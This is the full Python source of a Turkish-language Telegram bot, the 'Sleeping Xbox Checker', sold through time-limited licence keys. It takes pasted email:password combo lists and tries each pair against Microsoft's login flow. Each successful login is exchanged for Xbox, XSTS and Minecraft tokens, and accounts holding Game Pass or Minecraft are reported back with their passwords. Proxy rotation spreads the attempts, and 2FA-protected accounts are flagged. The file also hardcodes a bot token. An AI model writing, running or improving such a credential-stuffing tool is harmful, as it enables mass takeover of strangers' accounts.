import os
import re
import time
import uuid
import json
import requests
import telebot
from telebot import types
from threading import Thread
from urllib.parse import urlparse, parse_qs

# --- AYARLAR VE TANIMLAMALAR ---
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
ADMIN_ID = 8664147577

bot = telebot.TeleBot(BOT_TOKEN)

# Veritabanı dosyaları
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
PROXIES_FILE = "proxies.txt"

# Hafıza önbelleği
user_sessions = {}  # Kullanıcı adımları takip etmek için
active_tasks = {}   # Çalışan tarama işlemlerini durdurabilmek için

# Dosyaları ilklendirme
if not os.path.exists(KEYS_FILE):
    with open(KEYS_FILE, 'w') as f: json.dump({}, f)
if not os.path.exists(USERS_FILE):
    with open(USERS_FILE, 'w') as f: json.dump({}, f)
if not os.path.exists(PROXIES_FILE):
    with open(PROXIES_FILE, 'w') as f: f.write("")

# Veri fonksiyonları
def load_json(filename):
    with open(filename, 'r') as f: return json.load(f)

def save_json(filename, data):
    with open(filename, 'w') as f: json.dump(data, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# --- XBOX CHECKER ENGINE ---
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_sftag(session):
    try:
        response = session.get(SFTAG_URL, timeout=10)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sftag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match: return match.group(1), sftag
    except: pass
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
        login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        
        if '#' in login_request.url and login_request.url != SFTAG_URL:
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, "success"
        elif 'cancel?mkt=' in login_request.text:
            try:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                ret = session.post(action_url, data=data, allow_redirects=True, timeout=10)
                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                fin = session.get(return_url, allow_redirects=True, timeout=10)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, "success"
            except: pass
        elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return None, "2fa"
        elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
            return None, "bad"
    except: return None, "error"
    return None, "error"

def get_xbox_token(session, ms_token):
    try:
        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except: pass
    return None, None

def get_xsts_token(session, xbox_token):
    try:
        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
        if response.status_code == 200: return response.json().get('Token')
    except: pass
    return None

def get_minecraft_token(session, uhs, xsts_token):
    try:
        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
        if response.status_code == 200: return response.json().get('access_token')
    except: pass
    return None

def check_minecraft_entitlements(session, mc_token):
    try:
        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
        if response.status_code == 200:
            text = response.text
            if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
            elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
            elif '"product_minecraft"' in text: return 'Minecraft'
            return 'Other'
    except: pass
    return None

# --- TELEGRAM BOT KLAVYELERİ (UI) ---
def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Tarama Başlat"), types.KeyboardButton("👤 Profilim"))
    if user_id == ADMIN_ID:
        markup.add(types.KeyboardButton("👑 Admin Paneli"))
    return markup

def admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Key Oluştur", callback_data="adm_gen_key"),
        types.InlineKeyboardButton("📜 Keyleri Listele", callback_data="adm_list_keys"),
        types.InlineKeyboardButton("🌐 Proxy Ekle/Yönet", callback_data="adm_proxies"),
        types.InlineKeyboardButton("📢 Duyuru Yap (Broadcast)", callback_data="adm_broadcast")
    )
    return markup

# --- CORE MANTIKSAL KONTROLLER ---
def check_user_access(user_id):
    users = load_json(USERS_FILE)
    if str(user_id) == str(ADMIN_ID):
        return True
    if str(user_id) in users:
        if users[str(user_id)]["expiry"] > time.time():
            return True
    return False

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    welcome_text = "💤 **Sleeping Xbox Checker Botuna Hoş Geldiniz!** 💤\n\n"
    
    if check_user_access(user_id):
        welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız (Key) olmalıdır.\n\nLütfen bir Key girin veya yöneticiden talep edin."
        user_sessions[user_id] = "waiting_for_key"
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_for_key")
def process_key_activation(message):
    user_id = message.from_user.id
    input_key = message.text.strip()
    keys = load_json(KEYS_FILE)
    users = load_json(USERS_FILE)

    if input_key in keys and not keys[input_key]["used"]:
        duration = keys[input_key]["duration"]
        expiry_time = time.time() + duration
        
        keys[input_key]["used"] = True
        keys[input_key]["used_by"] = user_id
        
        users[str(user_id)] = {"expiry": expiry_time, "username": message.from_user.username}
        
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        
        user_sessions[user_id] = None
        bot.send_message(message.chat.id, "✅ **Key Başarıyla Aktif Edildi!**\nSisteme tam erişiminiz sağlandı.", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        bot.send_message(message.chat.id, "❌ Geçersiz veya daha önce kullanılmış bir Key girdiniz. Lütfen tekrar deneyin:")

@bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
def profile_handler(message):
    user_id = message.from_user.id
    if not check_user_access(user_id): return
    
    users = load_json(USERS_FILE)
    if str(user_id) == str(ADMIN_ID):
        expiry = "Sonsuz (Kurucu)"
    else:
        rem = users[str(user_id)]["expiry"] - time.time()
        expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"])) if rem > 0 else "Süresi Dolmuş"
        
    status_text = f"👤 **Kullanıcı Bilgileri:**\n\n🆔 **ID:** `{user_id}`\n⏳ **Lisans Bitiş:** `{expiry}`"
    bot.send_message(message.chat.id, status_text, parse_mode="Markdown")

# --- ADMIN PANELİ VE MODÜLLERİ ---
@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli" and msg.from_user.id == ADMIN_ID)
def admin_panel(message):
    bot.send_message(message.chat.id, "🔮 **Sleeping Xbox Checker Kontrol Paneli**", reply_markup=admin_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    
    if call.data == "adm_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("1 Günlük", callback_data="key_86400"),
            types.InlineKeyboardButton("7 Günlük", callback_data="key_604800"),
            types.InlineKeyboardButton("30 Günlük", callback_data="key_2592000")
        )
        bot.edit_message_text("Oluşturulacak Key süresini seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "adm_list_keys":
        keys = load_json(KEYS_FILE)
        if not keys:
            bot.answer_callback_query(call.id, "Hiç key oluşturulmamış.")
            return
        text = "📜 **Sistemdeki Anahtarlar:**\n\n"
        for k, v in keys.items():
            dur_days = v['duration'] // 86400
            status = f"✅ Kullanılmadı ({dur_days} Gün)" if not v['used'] else f"❌ {v['used_by']} tarafından kullanıldı"
            text += f"`{k}` -> {status}\n"
        bot.edit_message_text(text[:4000], call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    elif call.data == "adm_proxies":
        proxies = load_proxies()
        text = f"🌐 **Proxy Yönetimi**\n\nMevcut yüklü proxy sayısı: `{len(proxies)}`"
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("➕ Proxy Yükle", callback_data="prox_add"),
            types.InlineKeyboardButton("🗑️ Tümünü Sil", callback_data="prox_clear")
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "adm_broadcast":
        user_sessions[call.from_user.id] = "waiting_broadcast"
        bot.send_message(call.message.chat.id, "📢 Göndermek istediğiniz duyuru mesajını yazın (Metin, fotoğraf veya markdown destekler):")

@bot.callback_query_handler(func=lambda call: call.data.startswith("key_"))
def process_key_generation(call):
    duration = int(call.data.split("_")[1])
    generated_key = f"SLEEPING-{str(uuid.uuid4())[:8].upper()}-{str(uuid.uuid4())[24:].upper()}"
    
    keys = load_json(KEYS_FILE)
    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
    save_json(KEYS_FILE, keys)
    
    bot.edit_message_text(f"🔑 **Yeni Key Başarıyla Üretildi:**\n\n`{generated_key}`\n\nSüre: {duration // 86400} Gün", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("prox_"))
def proxy_actions(call):
    if call.data == "prox_add":
        user_sessions[call.from_user.id] = "waiting_proxies"
        bot.send_message(call.message.chat.id, "📝 Proxyleri her satıra bir adet gelecek şekilde `ip:port` veya `ip:port:user:pass` formatında gönderin:")
    elif call.data == "prox_clear":
        with open(PROXIES_FILE, 'w') as f: f.write("")
        bot.edit_message_text("🗑️ Tüm proxyler sistemden temizlendi.", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_proxies" and msg.from_user.id == ADMIN_ID)
def save_incoming_proxies(message):
    proxy_data = message.text.strip()
    with open(PROXIES_FILE, 'a') as f:
        f.write(proxy_data + "\n")
    user_sessions[message.from_user.id] = None
    proxies = load_proxies()
    bot.send_message(message.chat.id, f"✅ Proxyler eklendi! Toplam güncel proxy sayısı: `{len(proxies)}`", parse_mode="Markdown")

@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_broadcast" and msg.from_user.id == ADMIN_ID)
def execute_broadcast(message):
    user_sessions[message.from_user.id] = None
    users = load_json(USERS_FILE)
    
    success, failed = 0, 0
    # Admini de ekle listenin içine garantilemek için
    user_ids = list(users.keys())
    if str(ADMIN_ID) not in user_ids: user_ids.append(str(ADMIN_ID))

    bot.send_message(message.chat.id, "⚡ Duyuru gönderimi başladı...")
    for uid in user_ids:
        try:
            bot.copy_message(chat_id=int(uid), from_chat_id=message.chat.id, message_id=message.message_id)
            success += 1
        except:
            failed += 1
    bot.send_message(message.chat.id, f"📢 **Duyuru Tamamlandı!**\n\n✅ Başarılı: `{success}`\n❌ Başarısız: `{failed}`", parse_mode="Markdown")

# --- XBOX TARAYICI BAŞLATMA VE YÖNETİMİ ---
@bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
def start_checker_flow(message):
    if not check_user_access(message.from_user.id): return
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🌐 Proxyli Mod", callback_data="mode_proxy"),
        types.InlineKeyboardButton("📱 Proxyless Mod (Kendi IP'n)", callback_data="mode_proxyless")
    )
    bot.send_message(message.chat.id, "🤖 Taramayı nasıl yürütmek istersiniz? Mod seçin:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def select_mode_and_request_combos(call):
    user_id = call.from_user.id
    mode = "proxy" if call.data == "mode_proxy" else "proxyless"
    
    if mode == "proxy" and len(load_proxies()) == 0:
        bot.answer_callback_query(call.id, "Sistemde yüklü proxy yok! Lütfen Proxyless mod seçin veya adminin yüklemesini bekleyin.", show_alert=True)
        return
        
    user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
    bot.edit_message_text(f"📂 **Mod Seçildi:** `{mode.upper()}`\n\nLütfen hesap listenizi `email:şifre` formatında her satıra bir adet olacak şekilde metin (text) olarak buraya yapıştırın veya yollayın:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: isinstance(user_sessions.get(msg.from_user.id), dict) and user_sessions[msg.from_user.id].get("step") == "waiting_combos")
def process_combos_and_run(message):
    user_id = message.from_user.id
    mode = user_sessions[user_id]["mode"]
    
    combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
    if not combos:
        bot.send_message(message.chat.id, "❌ Geçerli hesap formatı bulunamadı. Lütfen satır satır `email:şifre` ilettiğinizden emin olun.")
        return

    user_sessions[user_id] = None
    bot.send_message(message.chat.id, f"⏳ {len(combos)} adet hesap doğrulama kuyruğuna alındı. İşlem başlatılıyor...")
    
    # Arka planda taramayı tetikle
    t = Thread(target=core_checker_worker, args=(user_id, combos, mode, message.chat.id))
    active_tasks[user_id] = True
    t.start()

# --- ARKA PLAN ÇALIŞMA MOTORU (THREADS) ---
def core_checker_worker(user_id, combos, mode, chat_id):
    proxies_list = load_proxies()
    proxy_index = 0
    
    status_msg = bot.send_message(chat_id, "📊 **Durum Grafiği**\n\n⏳ Hazırlanıyor...", parse_mode="Markdown")
    
    hits, bad, twofa, errors, checked = 0, 0, 0, 0, 0
    total = len(combos)
    
    for combo in combos:
        if user_id in active_tasks and not active_tasks[user_id]:
            break # İptal edildiyse durdur
            
        parts = combo.split(':')
        email = parts[0]
        password = ':'.join(parts[1:])
        
        session = requests.Session()
        session.verify = False
        
        if mode == "proxy" and proxies_list:
            p = proxies_list[proxy_index % len(proxies_list)]
            proxy_index += 1
            session.proxies = {"http": f"http://{p}", "https://{p}": f"http://{p}"}
            
        checked += 1
        
        # 1. Aşama Sftag Alımı
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            errors += 1
        else:
            # 2. Aşama Microsoft Login
            ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
            
            if auth_status == "2fa":
                twofa += 1
                bot.send_message(chat_id, f"⚠️ **[2FA]** `{email}`", parse_mode="Markdown")
            elif auth_status == "bad":
                bad += 1
            elif auth_status == "success" and ms_token:
                # 3. Aşama Xbox Token Alımı
                xbox_token, uhs = get_xbox_token(session, ms_token)
                if xbox_token and uhs:
                    # 4. Aşama XSTS Token Alımı
                    xsts_token = get_xsts_token(session, xbox_token)
                    if xsts_token:
                        # 5. Aşama Minecraft/Xbox Sorgusu
                        mc_token = get_minecraft_token(session, uhs, xsts_token)
                        if mc_token:
                            acc_type = check_minecraft_entitlements(session, mc_token)
                            if acc_type:
                                hits += 1
                                hit_text = f"🟢 **[HIT] XBOX HESABI BULUNDU!** 🟢\n\n📧 **E-posta:** `{email}`\n🔑 **Şifre:** `{password}`\n🎮 **Ürün/Tür:** `{acc_type}`"
                                bot.send_message(chat_id, hit_text, parse_mode="Markdown")
                            else:
                                bad += 1 # Paket yoksa boş hesap kabul edilir
                        else: errors += 1
                    else: errors += 1
                else: errors += 1
            else:
                bad += 1
                
        # Her 3 hesapta bir veya sonda canlı arayüz tablosunu güncelle
        if checked % 3 == 0 or checked == total:
            progress_text = f"💤 **Sleeping Xbox Checker Canlı Rapor** 💤\n\n" \
                            f"🔄 **İlerleme:** `{checked}/{total}`\n" \
                            f"🟢 **Hit (Başarılı):** `{hits}`\n" \
                            f"🔴 **Bad (Hatalı):** `{bad}`\n" \
                            f"🟡 **2FA (Doğrulama):** `{twofa}`\n" \
                            f"❌ **Hata (Proxy/Bağlantı):** `{errors}`"
            try:
                bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
            except: pass
            
        time.sleep(0.3) # Rate limit yememek için hafif bekleme
        
    bot.send_message(chat_id, f"🏁 **Tarama Tamamlandı!** Toplam `{total}` hesap taranıp sonuçlandırıldı.", reply_markup=main_keyboard(user_id))
    if user_id in active_tasks: del active_tasks[user_id]

# --- SİSTEMİ AYAĞA KALDIRMA ---
if __name__ == '__main__':
    print("[+] Sleeping Xbox Checker aktif edildi. Bot emirlerini bekliyor...")
    bot.infinity_polling()
